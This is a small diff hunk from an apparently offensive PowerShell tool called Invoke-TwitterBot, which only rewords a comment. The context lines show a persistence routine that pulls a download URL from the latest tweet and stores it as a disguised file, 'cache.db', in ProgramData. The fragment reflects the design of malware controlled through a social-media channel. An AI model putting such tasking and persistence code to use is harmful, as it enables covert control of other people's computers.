@@ -291,7 +291,7 @@ Function Invoke-TwitterBot {
         Function PersistCommand {
             
             [string] $downloadURL = $LatestTweet.split('|')[1]
-            #This is hardcoded in due to MAX_PATH limitations in shortcuts. if changed $RunPath must be reencoded and must remain under 259 characters
+            #This is hardcoded in due to MAX_PATH limitations in shortcuts. if changed $RunArguments must be reencoded and must remain under 259 characters
             [string] $FileOnDisk = "$env:programdata\cache.db"
 
             if ($downloadURL.Substring(0,5) -ceq "https") {
